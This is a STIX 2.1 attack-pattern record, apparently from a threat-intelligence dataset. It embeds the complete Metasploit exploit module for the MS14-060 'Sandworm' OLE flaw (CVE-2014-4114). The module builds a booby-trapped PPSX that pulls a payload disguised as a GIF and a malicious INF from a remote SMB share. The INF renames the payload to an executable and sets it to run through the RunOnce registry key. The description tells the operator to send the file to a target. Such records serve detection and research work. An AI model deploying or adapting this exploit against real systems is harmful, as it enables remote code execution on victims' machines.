{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--846a642b-63b1-44d9-ba7b-5e9d211962dd",
    "created": "2024-08-14T16:37:46.566289Z",
    "modified": "2024-08-14T16:37:46.566293Z",
    "name": "\"MS14-060 Microsoft Windows OLE Package Manager Code Execution\"",
    "description": " This module exploits a vulnerability found in Windows Object Linking and Embedding (OLE) allowing arbitrary code execution, publicly known as \"Sandworm\". Platforms such as Windows Vista SP2 all the way to Windows 8, Windows Server 2008 and 2012 are known to be vulnerable. However, based on our testing, the most reliable setup is on Windows platforms running Office 2013 and Office 2010 SP2. And please keep in mind that some other setups such as using Office 2010 SP1 might be less stable, and sometimes may end up with a crash due to a failure in the CPackage::CreateTempFileName function.  This module will generate three files: an INF, a GIF, and a PPSX file. You are required to set up a SMB or Samba 3 server and host the INF and GIF there. Systems such as Ubuntu or an older version of Windows (such as XP) work best for this because they require little configuration to get going. The PPSX file is what you should send to your target.  In detail, the vulnerability has to do with how the Object Packager 2 component (packager.dll) handles an INF file that contains malicious registry changes, which may be leveraged for code execution. First of all, Packager does not load the INF file directly. As an attacker, you can trick it to load your INF anyway by embedding the file path as a remote share in an OLE object. The packager will then treat it as a type of media file and load it with the packager!CPackage::OLE2MPlayerReadFromStream function, which will download it with a CopyFileW call, save it in a temp folder, and pass that information for later. The exploit will do this loading process twice: first for a fake gif file that's actually the payload, and the second for the INF file.  The packager will also look at each OLE object's XML Presentation Command, specifically the type and cmd property. In the exploit, \"verb\" media command type is used, and this triggers the packager!CPackage::DoVerb function. Also, \"-3\" is used as the fake gif file's cmd property, and \"3\" is used for the INF. When the cmd is \"-3\", DoVerb will bail. But when \"3\" is used (again, for the INF file), it will cause the packager to try to find appropriate handler for it, which will end up with C:\\Windows\\System32\\infDefaultInstall.exe, and that will install/run the malicious INF file, and finally give us arbitrary code execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/ms14_060_sandworm.rb",
            "external_id": "ms14_060_sandworm.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-4114"
        },
        {
            "source_name": "reference",
            "url": "http://www.isightpartners.com/2014/10/cve-2014-4114/"
        },
        {
            "source_name": "reference",
            "url": "http://blog.trendmicro.com/trendlabs-security-intelligence/an-analysis-of-windows-zero-day-vulnerability-cve-2014-4114-aka-sandworm/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/ole'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::EXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS14-060 Microsoft Windows OLE Package Manager Code Execution\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in Windows Object Linking and Embedding (OLE)\n        allowing arbitrary code execution, publicly known as \"Sandworm\". Platforms such as Windows\n        Vista SP2 all the way to Windows 8, Windows Server 2008 and 2012 are known to be\n        vulnerable. However, based on our testing, the most reliable setup is on Windows platforms\n        running Office 2013 and Office 2010 SP2. And please keep in mind that some other setups such\n        as using Office 2010 SP1 might be less stable, and sometimes may end up with a crash due to\n        a failure in the CPackage::CreateTempFileName function.\n\n        This module will generate three files: an INF, a GIF, and a PPSX file. You are required to\n        set up a SMB or Samba 3 server and host the INF and GIF there. Systems such as Ubuntu or an\n        older version of Windows (such as XP) work best for this because they require little\n        configuration to get going. The PPSX file is what you should send to your target.\n\n        In detail, the vulnerability has to do with how the Object Packager 2 component\n        (packager.dll) handles an INF file that contains malicious registry changes, which may be\n        leveraged for code execution. First of all, Packager does not load the INF file directly.\n        As an attacker, you can trick it to load your INF anyway by embedding the file path as\n        a remote share in an OLE object. The packager will then treat it as a type of media file,\n        and load it with the packager!CPackage::OLE2MPlayerReadFromStream function, which will\n        download it with a CopyFileW call, save it in a temp folder, and pass that information for\n        later. The exploit will do this loading process twice: first for a fake gif file that's\n        actually the payload, and the second for the INF file.\n\n        The packager will also look at each OLE object's XML Presentation Command, specifically the\n        type and cmd property. In the exploit, \"verb\" media command type is used, and this triggers\n        the packager!CPackage::DoVerb function. Also, \"-3\" is used as the fake gif file's cmd\n        property, and \"3\" is used for the INF. When the cmd is \"-3\", DoVerb will bail. But when \"3\"\n        is used (again, for the INF file), it will cause the packager to try to find appropriate\n        handler for it, which will end up with C:\\Windows\\System32\\infDefaultInstall.exe, and that\n        will install/run the malicious INF file, and finally give us arbitrary code execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Unknown', # Vulnerability discovery\n          'sinn3r', # Metasploit module\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2014-4114'],\n          ['OSVDB', '113140'],\n          ['MSB', 'MS14-060'],\n          ['BID', '70419'],\n          ['URL' , 'http://www.isightpartners.com/2014/10/cve-2014-4114/'],\n          ['URL', 'http://blog.trendmicro.com/trendlabs-security-intelligence/an-analysis-of-windows-zero-day-vulnerability-cve-2014-4114-aka-sandworm/']\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 2048,\n          'DisableNops' => true\n        },\n      'Platform'       => 'win',\n      'Arch'           => ARCH_X86,\n      'Targets'        =>\n        [\n          ['Windows 7 SP1 / Office 2010 SP2 / Office 2013', {}],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2014-10-14',\n      'Notes'          => {\n        'Stability' => [CRASH_SAFE],\n        'SideEffects' => [],\n        'Reliability' => [],\n        'AKA' => ['sandworm']},\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [true, 'The PPSX file', 'msf.ppsx']),\n        OptString.new('UNCPATH', [ true, 'The UNC folder to use (Ex: \\\\\\\\192.168.1.1\\\\share)' ])\n      ])\n  end\n\n  def exploit\n    @unc = validate_unc_path\n\n    if @unc.nil?\n      fail_with(Failure::BadConfig, \"UNCPATH must be a remote shared folder\")\n    end\n\n    print_status(\"Creating the EXE payload...\")\n    payload_name = \"#{rand_text_alpha(4)}.gif\"\n    p = generate_payload_exe\n\n    print_status(\"Creating the INF file...\")\n    inf_name = \"#{rand_text_alpha(4)}.inf\"\n    inf = inf_file(payload_name)\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    exe_stream = ole_exe(payload_name)\n    inf_stream = ole_inf(inf_name)\n    zip = zip_ppsx(exe_stream, inf_stream)\n    file_create(zip)\n\n    payload_path = my_file_create(p, payload_name)\n    print_good(\"#{payload_name} stored at #{payload_path}, copy it to the remote share: #{@unc}\")\n\n    inf_path = my_file_create(inf, inf_name)\n    print_good(\"#{inf_name} stored at #{inf_path}, copy it to the remote share: #{@unc}\")\n  end\n\n  def validate_unc_path\n    if datastore['UNCPATH'] =~ /^\\\\{2}[[:print:]]+\\\\[[:print:]]+\\\\*$/\n      unc = datastore['UNCPATH']\n    else\n      unc = nil\n    end\n\n    unc\n  end\n\n  def my_file_create(data, name)\n    ltype = \"exploit.fileformat.#{self.shortname}\"\n    path = store_local(ltype, nil, data, name)\n\n    path\n  end\n\n  def zip_ppsx(ole_exe, ole_inf)\n    zip_data = {}\n    data_dir = File.join(Msf::Config.data_directory, 'exploits', 'CVE-2014-4114', 'template')\n\n    Dir[\"#{data_dir}/**/**\"].each do |file|\n      unless File.directory?(file)\n        zip_data[file.sub(data_dir,'')] = File.read(file)\n      end\n    end\n\n    # add the otherwise skipped \"hidden\" file\n    file = \"#{data_dir}/_rels/.rels\"\n    zip_data[file.sub(data_dir,'')] = File.read(file)\n\n    # put our own OLE streams\n    zip_data['/ppt/embeddings/oleObject1.bin'] = ole_exe\n    zip_data['/ppt/embeddings/oleObject2.bin'] = ole_inf\n\n    # create the ppsx\n    ppsx = Rex::Zip::Archive.new\n    zip_data.each_pair do |k,v|\n      ppsx.add_file(k,v)\n    end\n\n    ppsx.pack\n  end\n\n  def ole_inf(file_name)\n    content = \"EmbeddedStg2.txt\\x00\"\n    content << \"#{@unc}\\\\#{file_name}\\x00\"\n\n    data = [content.length].pack('V')\n    data << content\n    ole = create_ole(\"\\x01OLE10Native\", data)\n\n    ole\n  end\n\n  def ole_exe(file_name)\n    content = \"EmbeddedStg1.txt\\x00\"\n    content << \"#{@unc}\\\\#{file_name}\\x00\"\n\n    data = [content.length].pack('V')\n    data << content\n\n    ole = create_ole(\"\\x01OLE10Native\", data)\n\n    ole\n  end\n\n  def create_ole(stream_name, data)\n    ole_tmp = Rex::Quickfile.new('ole')\n    stg = Rex::OLE::Storage.new(ole_tmp.path, Rex::OLE::STGM_WRITE)\n\n    stm = stg.create_stream(stream_name)\n    stm << data\n    stm.close\n\n    directory = stg.instance_variable_get(:@directory)\n    directory.each_entry do |entry|\n      if entry.instance_variable_get(:@_ab) == 'Root Entry'\n        # 02260200-0000-0000-c000-000000000046 # Video clip\n        clsid = Rex::OLE::CLSID.new(\"\\x02\\x26\\x02\\x00\\x00\\x00\\x00\\x00\\xc0\\x00\\x00\\x00\\x00\\x00\\x00\\x46\")\n        entry.instance_variable_set(:@_clsId, clsid)\n      end\n    end\n\n    # write to disk\n    stg.close\n\n    ole_contents = File.read(ole_tmp.path)\n    ole_tmp.close\n    ole_tmp.unlink\n\n    ole_contents\n  end\n\n  def inf_file(gif_name)\n    inf = <<-EOF\n; 61883.INF\n; Copyright (c) Microsoft Corporation.  All rights reserved.\n\n[Version]\nSignature = \"$CHICAGO$\"\nClass=61883\nClassGuid={7EBEFBC0-3200-11d2-B4C2-00A0C9697D17}\nProvider=%Msft%\nDriverVer=06/21/2006,6.1.7600.16385\n\n[DestinationDirs]\nDefaultDestDir = 1\n\n[DefaultInstall]\nRenFiles = RxRename\nAddReg = RxStart\n\n[RxRename]\n#{gif_name}.exe, #{gif_name}\n[RxStart]#\nHKLM,Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce,Install,,%1%\\\\#{gif_name}.exe\nEOF\n\n    inf\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-10-14",
    "x_mitre_platforms": [
        "win'"
    ]
}